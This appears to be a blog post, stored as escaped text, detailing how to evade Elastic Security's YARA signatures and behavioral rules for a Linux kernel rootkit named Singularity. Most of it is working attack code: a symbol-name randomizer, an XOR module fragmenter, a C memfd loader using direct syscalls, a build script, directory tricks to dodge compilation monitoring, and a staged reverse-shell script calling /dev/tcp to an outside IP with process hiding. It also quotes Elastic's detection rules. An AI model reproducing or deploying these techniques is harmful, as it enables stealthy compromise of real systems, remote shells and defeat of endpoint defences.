fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like 